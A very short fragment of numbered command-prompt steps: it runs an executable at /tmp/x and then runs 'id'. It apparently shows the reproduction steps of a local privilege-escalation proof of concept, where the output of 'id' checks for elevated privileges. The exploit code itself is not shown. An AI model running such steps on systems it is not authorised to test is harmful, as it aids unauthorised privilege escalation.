1. In command prompt type: 
```
/tmp/x
```
2. In command prompt type: 
```
id
```

